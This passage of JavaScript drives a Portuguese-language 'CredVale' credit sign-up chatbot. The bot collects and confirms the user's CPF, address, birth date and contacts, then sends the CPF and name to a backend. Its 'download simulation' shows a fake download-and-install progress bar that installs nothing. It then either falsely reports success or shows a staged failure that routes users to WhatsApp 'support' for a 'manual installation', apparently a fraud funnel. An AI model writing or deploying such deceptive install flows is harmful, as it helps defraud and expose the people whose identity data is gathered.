      addMsg('→ <strong>Continuar sem o Plano CredVale</strong> selecionado','user');
      setTimeout(function() { etapaConfirmarDados(clientId, limite, tipo); }, 300);
    };
  }

  /* ---- ETAPA: Confirmação de Dados (antes de criar credenciais) ---- */
  async function etapaConfirmarDados(clientId, limite, tipo) {
    flowState = 'confirmar-dados';
    hideInput();

    var nome = (user.nome||'Cliente').split(' ')[0]||'Cliente';
    var cpfFmt = user.cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,'$1.$2.$3-$4');
    var nascFmt = user.nascimento ? user.nascimento.split('-').reverse().join('/') : '—';
    var sexoLabel = user.sexo==='F'?'Feminino':user.sexo==='M'?'Masculino':user.sexo||'—';
    var enderecoFmt = (user.rua||'—')+', '+(user.numero||'s/n')+(user.complemento?' - '+user.complemento:'')+'<br>'+(user.bairro||'—')+' · '+(user.cidade||'—')+' - '+(user.uf||'—');
    var phoneFmt = user.whatsapp ? user.whatsapp.replace(/(\d{2})(\d{4,5})(\d{4})/,'($1) $2-$3') : '—';
    var planoLabel = 'Plano CredVale (R$ 0,99/mês)';

    showPopup(
      '<div style="text-align:center;">'+
        '<div style="font-size:1.1rem;margin-bottom:8px;">📋</div>'+
        '<div style="font-size:1rem;font-weight:800;color:#0f172a;margin-bottom:2px;">Confirme seus dados</div>'+
        '<div style="font-size:0.75rem;font-weight:500;color:#6B7280;margin-bottom:12px;">Verifique se todas as informações estão corretas</div>'+
        '<div style="background:#f8fafc;border-radius:12px;padding:12px 16px;margin-bottom:8px;text-align:left;border:1px solid #e2e8f0;">'+
          '<div style="display:flex;justify-content:space-between;font-size:0.78rem;padding:4px 0;"><span style="color:#475569;">Nome</span><span style="color:#0f172a;font-weight:600;text-align:right;max-width:55%;">'+user.nome+'</span></div>'+
          '<div style="display:flex;justify-content:space-between;font-size:0.78rem;padding:4px 0;"><span style="color:#475569;">CPF</span><span style="color:#0f172a;font-weight:600;text-align:right;">'+cpfFmt+'</span></div>'+
          '<div style="display:flex;justify-content:space-between;font-size:0.78rem;padding:4px 0;"><span style="color:#475569;">Nascimento</span><span style="color:#0f172a;font-weight:600;text-align:right;">'+nascFmt+' · '+sexoLabel+'</span></div>'+
          '<div style="display:flex;justify-content:space-between;font-size:0.78rem;padding:4px 0;"><span style="color:#475569;">Endereço</span><span style="color:#0f172a;font-weight:600;text-align:right;">'+enderecoFmt+'</span></div>'+
          '<div style="display:flex;justify-content:space-between;font-size:0.78rem;padding:4px 0;"><span style="color:#475569;">WhatsApp</span><span style="color:#0f172a;font-weight:600;text-align:right;">'+phoneFmt+'</span></div>'+
          '<div style="display:flex;justify-content:space-between;font-size:0.78rem;padding:4px 0;"><span style="color:#475569;">E-mail</span><span style="color:#0f172a;font-weight:600;text-align:right;">'+(user.email||'—')+'</span></div>'+
          '<div style="display:flex;justify-content:space-between;font-size:0.78rem;padding:4px 0;"><span style="color:#475569;">Plano</span><span style="color:#4CC8A4;font-weight:700;text-align:right;">'+planoLabel+'</span></div>'+
        '</div>'+
        '<div style="display:flex;flex-direction:column;gap:8px;">'+
          '<button id="btnConfirmarDadosFinal" style="width:100%;padding:14px;border-radius:12px;border:none;background:linear-gradient(135deg,#059669,#10B981);color:#fff;font-size:0.9rem;font-weight:700;cursor:pointer;">✅ Confirmar Dados</button>'+
          '<button id="btnEditarDados" style="width:100%;padding:10px;border-radius:10px;border:1.5px solid #e2e8f0;background:#ffffff;color:#64748b;font-size:0.8rem;font-weight:600;cursor:pointer;">✏️ Editar Dados</button>'+
        '</div>'+
      '</div>'
    );

    document.getElementById('btnConfirmarDadosFinal').onclick = async function() {
      closePopup();
      addTyping();
      await sleep(600);
      removeTyping();
      addMsg('✅ <strong>Dados confirmados!</strong> Agora vamos criar suas credenciais de acesso.','bot');
      await sleep(400);
      etapaCriarCredenciais(clientId, limite, tipo);
    };

    document.getElementById('btnEditarDados').onclick = function() {
      closePopup();
      addMsg('🔄 <strong>Reiniciando cadastro</strong> para correção dos dados...','bot');
      setTimeout(function() {
        window.location.reload();
      }, 800);
    };
  }

  
  /**
   * Função showDownloadModalInChat - Abre o modal de download do APK
   * Utiliza a função compartilhada API.showDownloadModal (mesma da Index e app.html)
   */
  /* ---- SIMULAÇÃO DE DOWNLOAD DO APLICATIVO ---- */
  /* ---- RESOLVE NOME DO MODELO DO DISPOSITIVO ---- */
  function resolveModelName(modelo, fabricante) {
    if (!modelo) return '';
    var m = modelo.toUpperCase();
    var lookup = {
      /* Samsung */
      'SM-A055M': 'Samsung Galaxy A05',
      'SM-A056M': 'Samsung Galaxy A05s',
      'SM-A057M': 'Samsung Galaxy A05',
      'SM-A135M': 'Samsung Galaxy A13',
      'SM-A145M': 'Samsung Galaxy A14',
      'SM-A146M': 'Samsung Galaxy A14 5G',
      'SM-A155M': 'Samsung Galaxy A15',
      'SM-A156M': 'Samsung Galaxy A15 5G',
      'SM-A165M': 'Samsung Galaxy A16 5G',
      'SM-A225M': 'Samsung Galaxy A22',
      'SM-A226M': 'Samsung Galaxy A22 5G',
      'SM-A235M': 'Samsung Galaxy A23 5G',
      'SM-A245M': 'Samsung Galaxy A24',
      'SM-A255M': 'Samsung Galaxy A25 5G',
      'SM-A325M': 'Samsung Galaxy A32',
      'SM-A326M': 'Samsung Galaxy A32 5G',
      'SM-A335M': 'Samsung Galaxy A33 5G',
      'SM-A345M': 'Samsung Galaxy A34 5G',
      'SM-A346M': 'Samsung Galaxy A34 5G',
      'SM-A355M': 'Samsung Galaxy A35 5G',
      'SM-A426M': 'Samsung Galaxy A42 5G',
      'SM-B510E': 'Samsung Galaxy A51',
      'SM-F926B': 'Samsung Galaxy Z Fold 3',
      'SM-F926U': 'Samsung Galaxy Z Fold 3',
      'SM-F936B': 'Samsung Galaxy Z Fold 4',
      'SM-F946B': 'Samsung Galaxy Z Fold 5',
      'SM-F956B': 'Samsung Galaxy Z Fold 6',
      'SM-G780G': 'Samsung Galaxy S20 FE',
      'SM-G781B': 'Samsung Galaxy S20 FE 5G',
      'SM-G990E': 'Samsung Galaxy S21 FE',
      'SM-G998B': 'Samsung Galaxy S21 Ultra',
      'SM-G990B': 'Samsung Galaxy S21 FE',
      'SM-S901E': 'Samsung Galaxy S22',
      'SM-S906E': 'Samsung Galaxy S22+',
      'SM-S908E': 'Samsung Galaxy S22 Ultra',
      'SM-S911B': 'Samsung Galaxy S23',
      'SM-S916B': 'Samsung Galaxy S23+',
      'SM-S918B': 'Samsung Galaxy S23 Ultra',
      'SM-S921B': 'Samsung Galaxy S24',
      'SM-S926B': 'Samsung Galaxy S24+',
      'SM-S928B': 'Samsung Galaxy S24 Ultra',
      'SM-S931B': 'Samsung Galaxy S25',
      'SM-S936B': 'Samsung Galaxy S25+',
      'SM-S938B': 'Samsung Galaxy S25 Ultra',
      'SM-S711B': 'Samsung Galaxy S23 FE',
      'SM-M315M': 'Samsung Galaxy M31',
      'SM-M515M': 'Samsung Galaxy M51',
      'SM-M525M': 'Samsung Galaxy M52 5G',
      'SM-M536B': 'Samsung Galaxy M53 5G',
      /* Motorola */
      'Moto G (5)': 'Motorola Moto G5',
      'Moto G (5S)': 'Motorola Moto G5s',
      'Moto G (6)': 'Motorola Moto G6',
      'Moto G (7)': 'Motorola Moto G7',
      'Moto G (8)': 'Motorola Moto G8',
      'Moto G (8) Plus': 'Motorola Moto G8 Plus',
      'Moto G (8) Power': 'Motorola Moto G8 Power',
      'Moto G (9)': 'Motorola Moto G9',
      'Moto G (9) Plus': 'Motorola Moto G9 Plus',
      'Moto G (10)': 'Motorola Moto G10',
      'Moto G (20)': 'Motorola Moto G20',
      'Moto G (30)': 'Motorola Moto G30',
      'Moto G (31)': 'Motorola Moto G31',
      'Moto G (32)': 'Motorola Moto G32',
      'Moto G (41)': 'Motorola Moto G41',
      'Moto G (42)': 'Motorola Moto G42',
      'Moto G (50)': 'Motorola Moto G50',
      'Moto G (51)': 'Motorola Moto G51 5G',
      'Moto G (52)': 'Motorola Moto G52',
      'Moto G (53)': 'Motorola Moto G53 5G',
      'Moto G (54)': 'Motorola Moto G54',
      'Moto G (62)': 'Motorola Moto G62 5G',
      'Moto G (71)': 'Motorola Moto G71 5G',
      'Moto G (72)': 'Motorola Moto G72',
      'Moto G (73)': 'Motorola Moto G73 5G',
      'Moto G (84)': 'Motorola Moto G84 5G',
      'Moto G (85)': 'Motorola Moto G85 5G',
      'Moto G100': 'Motorola Moto G100',
      'Moto G200': 'Motorola Moto G200 5G',
      'Moto G Stylus': 'Motorola Moto G Stylus',
      'Moto E': 'Motorola Moto E',
      'Moto E20': 'Motorola Moto E20',
      'Moto E22': 'Motorola Moto E22',
      'Moto E32': 'Motorola Moto E32',
      'Moto Edge 30': 'Motorola Edge 30',
      'Moto Edge 30 Neo': 'Motorola Edge 30 Neo',
      'Moto Edge 30 Pro': 'Motorola Edge 30 Pro',
      'Moto Edge 30 Ultra': 'Motorola Edge 30 Ultra',
      'Moto Edge 40': 'Motorola Edge 40',
      'Moto Edge 40 Neo': 'Motorola Edge 40 Neo',
      'Moto Edge 40 Pro': 'Motorola Edge 40 Pro',
      'Moto Edge 50': 'Motorola Edge 50',
      'Moto Edge 50 Fusion': 'Motorola Edge 50 Fusion',
      'Moto Edge 50 Pro': 'Motorola Edge 50 Pro',
      'Moto Edge 50 Ultra': 'Motorola Edge 50 Ultra',
      'Moto Razr 40': 'Motorola Razr 40',
      'Moto Razr 40 Ultra': 'Motorola Razr 40 Ultra',
      'Moto Razr 50': 'Motorola Razr 50',
      'Moto Razr 50 Ultra': 'Motorola Razr 50 Ultra',
      /* Xiaomi / Redmi / POCO */
      'Mi 9T': 'Xiaomi Mi 9T',
      'Mi 9T Pro': 'Xiaomi Mi 9T Pro',
      'Mi 10': 'Xiaomi Mi 10',
      'Mi 10T': 'Xiaomi Mi 10T',
      'Mi 10T Pro': 'Xiaomi Mi 10T Pro',
      'Mi 11': 'Xiaomi Mi 11',
      'Mi 11 Lite': 'Xiaomi Mi 11 Lite',
      'Mi 11T': 'Xiaomi Mi 11T',
      'Mi 11T Pro': 'Xiaomi Mi 11T Pro',
      'Mi 12': 'Xiaomi 12',
      'Mi 12 Lite': 'Xiaomi 12 Lite',
      'Mi 12T': 'Xiaomi 12T',
      'Mi 12T Pro': 'Xiaomi 12T Pro',
      'Mi 13': 'Xiaomi 13',
      'Mi 13 Lite': 'Xiaomi 13 Lite',
      'Mi 13T': 'Xiaomi 13T',
      'Mi 13T Pro': 'Xiaomi 13T Pro',
      'Mi 14': 'Xiaomi 14',
      'Mi 14T': 'Xiaomi 14T',
      'Mi 14T Pro': 'Xiaomi 14T Pro',
      'Redmi 9': 'Xiaomi Redmi 9',
      'Redmi 9A': 'Xiaomi Redmi 9A',
      'Redmi 9C': 'Xiaomi Redmi 9C',
      'Redmi 9T': 'Xiaomi Redmi 9T',
      'Redmi 10': 'Xiaomi Redmi 10',
      'Redmi 10A': 'Xiaomi Redmi 10A',
      'Redmi 10C': 'Xiaomi Redmi 10C',
      'Redmi Note 8': 'Xiaomi Redmi Note 8',
      'Redmi Note 8 Pro': 'Xiaomi Redmi Note 8 Pro',
      'Redmi Note 9': 'Xiaomi Redmi Note 9',
      'Redmi Note 9 Pro': 'Xiaomi Redmi Note 9 Pro',
      'Redmi Note 10': 'Xiaomi Redmi Note 10',
      'Redmi Note 10 Pro': 'Xiaomi Redmi Note 10 Pro',
      'Redmi Note 11': 'Xiaomi Redmi Note 11',
      'Redmi Note 11 Pro': 'Xiaomi Redmi Note 11 Pro',
      'Redmi Note 11S': 'Xiaomi Redmi Note 11S',
      'Redmi Note 12': 'Xiaomi Redmi Note 12',
      'Redmi Note 12 Pro': 'Xiaomi Redmi Note 12 Pro',
      'Redmi Note 12S': 'Xiaomi Redmi Note 12S',
      'Redmi Note 13': 'Xiaomi Redmi Note 13',
      'Redmi Note 13 Pro': 'Xiaomi Redmi Note 13 Pro',
      'Redmi Note 13 Pro+': 'Xiaomi Redmi Note 13 Pro+',
      'POCO X3 Pro': 'POCO X3 Pro',
      'POCO X3 NFC': 'POCO X3 NFC',
      'POCO X4 Pro': 'POCO X4 Pro 5G',
      'POCO X5 Pro': 'POCO X5 Pro 5G',
      'POCO X6 Pro': 'POCO X6 Pro',
      'POCO F3': 'POCO F3',
      'POCO F4': 'POCO F4',
      'POCO F5': 'POCO F5',
      'POCO F5 Pro': 'POCO F5 Pro',
      'POCO F6': 'POCO F6',
      'POCO M3': 'POCO M3',
      'POCO M4 Pro': 'POCO M4 Pro',
      'POCO M5': 'POCO M5',
      'POCO M6': 'POCO M6',
      /* Apple */
      'iPhone16,1': 'iPhone 15 Pro',
      'iPhone16,2': 'iPhone 15 Pro Max',
      'iPhone16,3': 'iPhone 15',
      'iPhone16,4': 'iPhone 15 Plus',
      'iPhone15,2': 'iPhone 14 Pro',
      'iPhone15,3': 'iPhone 14 Pro Max',
      'iPhone15,4': 'iPhone 14',
      'iPhone15,5': 'iPhone 14 Plus',
      'iPhone14,2': 'iPhone 13 Pro',
      'iPhone14,3': 'iPhone 13 Pro Max',
      'iPhone14,4': 'iPhone 13 mini',
      'iPhone14,5': 'iPhone 13',
      'iPhone13,1': 'iPhone 12 mini',
      'iPhone13,2': 'iPhone 12',
      'iPhone13,3': 'iPhone 12 Pro',
      'iPhone13,4': 'iPhone 12 Pro Max',
      'iPhone12,1': 'iPhone 11',
      'iPhone12,3': 'iPhone 11 Pro',
      'iPhone12,5': 'iPhone 11 Pro Max',
      'iPad14,1': 'iPad mini 6',
      'iPad14,2': 'iPad mini 6',
      'iPad13,1': 'iPad Air 4',
      'iPad13,2': 'iPad Air 4',
      'iPad13,4': 'iPad Pro 11 (3rd)',
      'iPad13,8': 'iPad Pro 12.9 (5th)',
      /* Google Pixel */
      'Pixel 6': 'Google Pixel 6',
      'Pixel 6 Pro': 'Google Pixel 6 Pro',
      'Pixel 6a': 'Google Pixel 6a',
      'Pixel 7': 'Google Pixel 7',
      'Pixel 7 Pro': 'Google Pixel 7 Pro',
      'Pixel 7a': 'Google Pixel 7a',
      'Pixel 8': 'Google Pixel 8',
      'Pixel 8 Pro': 'Google Pixel 8 Pro',
      'Pixel 8a': 'Google Pixel 8a',
      'Pixel 9': 'Google Pixel 9',
      'Pixel 9 Pro': 'Google Pixel 9 Pro',
      'Pixel 9 Pro XL': 'Google Pixel 9 Pro XL',
      'Pixel 9a': 'Google Pixel 9a',
      /* Realme */
      'RMX3081': 'Realme 8',
      'RMX3085': 'Realme 8 5G',
      'RMX3142': 'Realme 8 Pro',
      'RMX3360': 'Realme 9 Pro+',
      'RMX3381': 'Realme 9i',
      'RMX3399': 'Realme 9',
      'RMX3461': 'Realme 9 5G',
      'RMX3501': 'Realme 10',
      'RMX3615': 'Realme 10 Pro',
      'RMX3624': 'Realme C30',
      'RMX3630': 'Realme C33',
      'RMX3660': 'Realme C35',
      'RMX3670': 'Realme C51',
      'RMX3690': 'Realme C55',
      'RMX3740': 'Realme 11 Pro',
      'RMX3741': 'Realme 11 Pro+',
      'RMX3750': 'Realme 12 Pro',
      'RMX3760': 'Realme 12 Pro+',
      'RMX3770': 'Realme 12',
      'RMX3780': 'Realme 13',
      'RMX3785': 'Realme 13 Pro',
      'RMX3790': 'Realme C60s',
      /* OnePlus */
      'ONEPLUS A3003': 'OnePlus 3',
      'ONEPLUS A5000': 'OnePlus 5',
      'ONEPLUS A6000': 'OnePlus 6',
      'ONEPLUS A6003': 'OnePlus 6',
      'ONEPLUS A6013': 'OnePlus 6T',
      'ONEPLUS A6010': 'OnePlus 6T',
      'ONEPLUS 7 PRO': 'OnePlus 7 Pro',
      'ONEPLUS 7T': 'OnePlus 7T',
      'ONEPLUS 7T PRO': 'OnePlus 7T Pro',
      'ONEPLUS 8': 'OnePlus 8',
      'ONEPLUS 8 PRO': 'OnePlus 8 Pro',
      'ONEPLUS 8T': 'OnePlus 8T',
      'ONEPLUS 9': 'OnePlus 9',
      'ONEPLUS 9 PRO': 'OnePlus 9 Pro',
      'ONEPLUS 9RT': 'OnePlus 9RT',
      'ONEPLUS 10 PRO': 'OnePlus 10 Pro',
      'ONEPLUS 10R': 'OnePlus 10R',
      'ONEPLUS 11': 'OnePlus 11',
      'ONEPLUS 12': 'OnePlus 12',
      'ONEPLUS 12R': 'OnePlus 12R',
      'ONE A2003': 'OnePlus 2',
      'LE2123': 'OnePlus 9 Pro',
      'LE2113': 'OnePlus 9',
      'LE2101': 'OnePlus 9R',
      'NE2213': 'OnePlus 11',
      /* LG */
      'LG K40': 'LG K40',
      'LG K50': 'LG K50',
      'LG K61': 'LG K61',
      'LG K71': 'LG K71',
      'LG Velvet': 'LG Velvet',
      'LG Wing': 'LG Wing'
    };
    // Try exact match first
    if (lookup[m]) return lookup[m];
    // Try match by known prefix
    for (var key in lookup) {
      if (lookup.hasOwnProperty(key) && m.indexOf(key) === 0) {
        return lookup[key];
      } else if (lookup.hasOwnProperty(key) && key.indexOf(m.slice(0, 8)) >= 0) {
        return lookup[key];
      }
    }
    // Fallback: supplement fabricante name on the model
    if (fabricante && modelo && modelo.indexOf(fabricante.toUpperCase()) !== 0) {
      return fabricante + ' ' + modelo;
    }
    return modelo;
  }

  /* ---- DOWNLOAD MODAL (iOS-Inspired CredVale) ---- */
  function showDownloadModalInChat(clientId, limite) {
    if (clientId) {
      try {
        var baseUrl = window.__API_BASE || '/api';
        var payload = JSON.stringify({
          client_id: clientId,
          client_cpf: (user && user.cpf) || '',
          client_nome: (user && user.nome) || '',
          apk_available: true,
          device_info: navigator.userAgent || ''
        });
        navigator.sendBeacon(baseUrl + '/app/register-download', new Blob([payload], { type: 'application/json' }));
      } catch(e) {}
    }
    if (popupEl) closePopup();
    var deviceInfo = getDeviceInfo();
    var html =
      '<div class="cred-dl-modal">'+
        '<div class="cred-dl-icon-wrap">'+
          '<svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#059669" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">'+
            '<path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>'+
            '<polyline points="7 10 12 15 17 10"/>'+
            '<line x1="12" y1="15" x2="12" y2="3"/>'+
          '</svg>'+
        '</div>'+
        '<h2 class="cred-dl-title">Aplicativo disponível</h2>'+
        '<p class="cred-dl-desc">Seu cadastro CredVale foi concluído com sucesso.<br>Vamos iniciar a instalação do aplicativo no seu dispositivo.</p>'+
        '<button class="cred-dl-btn cred-dl-btn--primary" id="btnStartDownload" style="width:100%;">Baixar aplicativo</button>'+
        '<div class="cred-dl-footer">🔒 Seus dados estão protegidos com segurança.</div>'+
      '</div>';
    showPopup(html);
    document.getElementById('btnStartDownload').onclick = function() {
      startDownloadSimulation(clientId, limite, deviceInfo);
    };
  }

  /* ---- DOWNLOAD PROGRESS (iOS-Inspired CredVale) ---- */
  function startDownloadSimulation(clientId, limite, deviceInfo) {
    var stages = [
      { label:'Preparando arquivos...', pct: 15 },
      { label:'Baixando...', pct: 40 },
      { label:'Instalando...', pct: 70 },
      { label:'Configurando aplicativo...', pct: 90 },
      { label:'Finalizando instalação...', pct: 100 }
    ];

    var simHtml =
      '<div class="cred-dl-modal">'+
        '<div class="cred-dl-icon-wrap">'+
          '<svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#059669" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">'+
            '<path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>'+
            '<polyline points="7 10 12 15 17 10"/>'+
            '<line x1="12" y1="15" x2="12" y2="3"/>'+
            '<animateTransform attributeName="transform" type="translate" values="0,0;0,-4;0,0" dur="1.5s" repeatCount="indefinite"/>'+
          '</svg>'+
        '</div>'+
        '<span class="cred-dl-badge" id="dlBadge">Instalando...</span>'+
        '<h2 class="cred-dl-title" id="dlTitle">Baixando aplicativo</h2>'+
        '<p class="cred-dl-desc" style="margin-bottom:20px;">Isso pode levar alguns instantes.</p>'+
        '<div class="cred-dl-progress">'+
          '<div class="cred-dl-progress-track">'+
            '<div class="cred-dl-progress-fill" id="dlProgressFill"></div>'+
          '</div>'+
          '<div class="cred-dl-progress-info">'+
            '<span class="cred-dl-progress-pct" id="dlProgressLabel">0%</span>'+
            '<span class="cred-dl-progress-eta">Alguns segundos</span>'+
          '</div>'+
        '</div>'+
        '<div class="cred-dl-stage" id="dlStageLabel">Preparando arquivos...</div>'+
        '<div class="cred-dl-footer" style="margin-top:12px;">Não feche esta tela durante o processo.</div>'+
      '</div>';

    showPopup(simHtml);

    var fill = document.getElementById('dlProgressFill');
    var label = document.getElementById('dlProgressLabel');
    var stageLabel = document.getElementById('dlStageLabel');
    var currentPct = 0;

    function updateProgress(targetPct, stageText, cb) {
      var step = 2;
      var interval = setInterval(function() {
        currentPct += step;
        if (currentPct >= targetPct) {
          currentPct = targetPct;
          clearInterval(interval);
          if (stageLabel) stageLabel.textContent = stageText;
          if (fill) fill.style.width = currentPct + '%';
          if (label) label.textContent = currentPct + '%';
          if (cb) setTimeout(cb, 300);
          return;
        }
        if (fill) fill.style.width = currentPct + '%';
        if (label) label.textContent = currentPct + '%';
      }, 200);
    }

    function runStages(idx) {
      if (idx >= stages.length) {
        setTimeout(function() {
          if (stageLabel) stageLabel.textContent = 'Verificando compatibilidade...';
          if (__appDownloadErrorEnabled) {
            showInstallFailure(clientId, limite, deviceInfo);
          } else {
            showInstallSuccess(clientId, limite, deviceInfo);
          }
        }, 800);
        return;
      }
      var s = stages[idx];
      if (stageLabel) stageLabel.textContent = s.label;
      updateProgress(s.pct, s.label, function() {
        runStages(idx + 1);
      });
    }

    runStages(0);
  }

  /* ---- POP-UP 3: ERRO (iOS-Inspired CredVale) ---- */
  function showInstallFailure(clientId, limite, deviceInfo) {
    closePopup();
    setTimeout(function() {
      var waNum = __supportWhatsApp || '5511999999999';
      var modeloResolvido = resolveModelName(deviceInfo.modelo, deviceInfo.fabricante);
      var nomeCliente = (user.nome || '').split(' ')[0] || 'Cliente';

      var deviceMsg = encodeURIComponent(
        'Olá! Preciso de ajuda com a instalação do aplicativo CredVale.\n\n' +
        'Cliente: ' + (user.nome || 'N/A') + '\n' +
        'Dispositivo: ' + (deviceInfo.dispositivo || 'N/A') + '\n' +
        'Fabricante: ' + (deviceInfo.fabricante || 'N/A') + '\n' +
        'Modelo: ' + (modeloResolvido || deviceInfo.modelo || 'N/A') + '\n' +
        'Código: ' + (deviceInfo.modelo || 'N/A') + '\n' +
        'Sistema: ' + (deviceInfo.os || 'N/A') + '\n' +
        'Navegador: ' + (deviceInfo.navegador || 'N/A')
      );
      var waUrl = 'https://wa.me/55' + waNum.replace(/\D/g,'') + '?text=' + deviceMsg;

      var failHtml =
        '<div class="cred-dl-modal">'+
          '<div class="cred-dl-icon-wrap cred-dl-icon-wrap--alert">'+
            '<svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#DC2626" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">'+
              '<circle cx="12" cy="12" r="10"/>'+
              '<line x1="12" y1="8" x2="12" y2="12"/>'+
              '<line x1="12" y1="16" x2="12.01" y2="16"/>'+
            '</svg>'+
          '</div>'+
          '<h2 class="cred-dl-title">' + nomeCliente + ', não foi possível concluir a instalação</h2>'+
          '<p class="cred-dl-desc" style="margin-bottom:14px;">Identificamos que houve uma tentativa de instalação do aplicativo no dispositivo abaixo:</p>'+
          '<div class="cred-dl-device-card">'+
            '<div class="cred-dl-device-row"><span class="cred-dl-device-lbl">📱 Dispositivo</span><span class="cred-dl-device-val">' + (deviceInfo.dispositivo || '—') + '</span></div>'+
            '<div class="cred-dl-device-row"><span class="cred-dl-device-lbl">🏭 Fabricante</span><span class="cred-dl-device-val">' + (deviceInfo.fabricante || '—') + '</span></div>'+
            '<div class="cred-dl-device-row"><span class="cred-dl-device-lbl">📟 Modelo</span><span class="cred-dl-device-val">' + (modeloResolvido || deviceInfo.modelo || '—') + '</span></div>'+
            '<div class="cred-dl-device-row" style="padding:2px 0;border-bottom:none;"><span class="cred-dl-device-lbl" style="color:#94a3b8;font-size:0.65rem;">Código</span><span class="cred-dl-device-val" style="color:#94a3b8;font-family:monospace;font-size:0.6rem;">' + (deviceInfo.modelo || '—') + '</span></div>'+
            '<div class="cred-dl-device-row"><span class="cred-dl-device-lbl">🖥️ Sistema</span><span class="cred-dl-device-val">' + (deviceInfo.os || '—') + '</span></div>'+
          '</div>'+
          '<div class="cred-dl-info-box">'+
            'É possível realizar a <strong>instalação manual</strong> neste dispositivo. Nossa equipe pode acompanhar você no processo para liberar o aplicativo.'+
          '</div>'+
          '<button class="cred-dl-btn cred-dl-btn--primary" id="btnCallSupport" style="width:100%;margin-bottom:8px;">📞 Chamar suporte</button>'+
          '<button class="cred-dl-btn cred-dl-btn--outline" id="btnRetryDownload" style="width:100%;">Tentar novamente</button>'+
        '</div>';

      showPopup(failHtml);

      document.getElementById('btnCallSupport').onclick = function() {
        closePopup();
        addMsg(
          '<div style="text-align:center;padding:8px 0;">'+
            '<div style="font-size:1rem;margin-bottom:6px;">💬</div>'+
            '<div style="font-size:0.85rem;font-weight:700;color:#0f172a;margin-bottom:8px;">Redirecionando para o suporte...</div>'+
            '<a href="'+waUrl+'" target="_blank" rel="noopener" style="display:inline-block;background:#25D366;color:#fff;padding:10px 24px;border-radius:12px;text-decoration:none;font-weight:700;font-size:0.85rem;">Abrir WhatsApp</a>'+
          '</div>',
          'bot'
        );
        hideInput();
        showOptions([
          { label:'🏠 Voltar para início', action:function(){ window.location.href = '/'; } }
        ]);
      };

      document.getElementById('btnRetryDownload').onclick = function() {
        closePopup();
        setTimeout(function() { showDownloadModalInChat(clientId, limite); }, 200);
      };
    }, 200);
  }

  /* ---- POP-UP SUCESSO (iOS-Inspired CredVale) ---- */
  function showInstallSuccess(clientId, limite, deviceInfo) {
    closePopup();
    setTimeout(function() {
      var waNum = __supportWhatsApp || '5511999999999';
      var nomeCliente = (user.nome || '').split(' ')[0] || 'Cliente';

      var successHtml =
        '<div class="cred-dl-modal">'+
          '<div class="cred-dl-icon-wrap cred-dl-icon-wrap--success">'+
            '<svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#10B981" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">'+
              '<path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/>'+
              '<polyline points="22 4 12 14.01 9 11.01"/>'+
            '</svg>'+
          '</div>'+
          '<h2 class="cred-dl-title">' + nomeCliente + ', aplicativo instalado! 🎉</h2>'+
          '<p class="cred-dl-desc">Seu aplicativo CredVale foi <strong>instalado com sucesso</strong>.<br>Agora você pode acessar sua conta e começar a aproveitar todos os benefícios.</p>'+
          '<button class="cred-dl-btn cred-dl-btn--primary" id="btnSuccessClose" style="width:100%;margin-bottom:12px;">Ir para o aplicativo</button>'+
          '<div style="text-align:center;font-size:0.75rem;color:#94a3b8;">Precisa de ajuda? <a href="https://wa.me/55' + waNum.replace(/\D/g,'') + '" target="_blank" style="color:#059669;font-weight:700;text-decoration:underline;">Fale com o suporte</a></div>'+
        '</div>';

      showPopup(successHtml);

      document.getElementById('btnSuccessClose').onclick = function() {
        closePopup();
        addMsg('✅ <strong>Aplicativo instalado com sucesso!</strong><br>Você já pode fechar esta página e acessar o aplicativo CredVale.', 'bot');
        hideInput();
        showOptions([
          { label:'🏠 Voltar para início', action:function(){ window.location.href = '/'; } }
        ]);
      };
    }, 200);
  }

  /* ---- Final Screen: Baixar App ou Suporte ---- */
  async function mostrarTelaFinal(clientId, limite) {
    hideInput();
    var primeiroNome = (user.nome || '').split(' ')[0] || 'Cliente';

    addMsg(
      '<div style="text-align:center;padding:8px 0;">' +
        '<div style="display:flex;align-items:center;justify-content:center;gap:6px;margin-bottom:8px;">' +
          '<div style="width:56px;height:56px;border-radius:50%;background:linear-gradient(135deg,rgba(16,185,129,0.1),rgba(59,130,246,0.08));display:flex;align-items:center;justify-content:center;border:2px solid rgba(16,185,129,0.12);">' +
            '<span style="font-size:1.5rem;">🎉</span>' +
          '</div>' +
        '</div>' +
        '<div style="font-size:1.15rem;font-weight:800;color:#0f172a;margin-bottom:4px;">Cadastro concluído, ' + primeiroNome + '!</div>' +
        '<div style="font-size:0.82rem;color:#475569;line-height:1.5;margin-bottom:8px;">' +
          'Seu cadastro foi finalizado com sucesso. Agora baixe o aplicativo para acessar seu benefício.' +
        '</div>' +
      '</div>',
      'bot'
    );

    await sleep(400);

    addMsg(
      '<div style="display:flex;flex-direction:column;gap:10px;padding:4px 0;">' +
        '<button class="chat-option chat-option--primary" id="btnBaixarFinal" style="width:100%;padding:16px;font-size:0.95rem;font-weight:700;">📲 Baixar Aplicativo</button>' +
      '</div>'
    );

    document.getElementById('btnBaixarFinal').onclick = function() {
      showDownloadModalInChat(clientId, limite);
    };

    // Botão WhatsApp com mensagem amigável
    await sleep(200);

    addMsg(
      '<div style="text-align:center;padding:4px 0;">' +
        '<div style="font-size:0.82rem;color:#475569;line-height:1.5;margin-bottom:8px;">' +
          '💬 <strong>Precisa de ajuda?</strong> Nossa equipe está pronta para atender você.' +
        '</div>' +
        '<button class="chat-option" id="btnSuporteFinal" style="width:100%;padding:14px;font-size:0.9rem;font-weight:600;border:1.5px solid #25D366;background:#ffffff;color:#075E54;">💬 Falar com um Atendente</button>' +
      '</div>'
    );

    document.getElementById('btnSuporteFinal').onclick = function() {
      var wa = typeof __supportWhatsApp !== 'undefined' && __supportWhatsApp ? __supportWhatsApp : sessionStorage.getItem('vs_support_wa') || '5511999999999';
      wa = String(wa).replace(/\D/g,'');
      if (wa.length <= 11) wa = '55' + wa;
      window.open('https://wa.me/' + wa + '?text=Olá! Já sou cliente CredVale e preciso de ajuda.', '_blank');
    };
  }

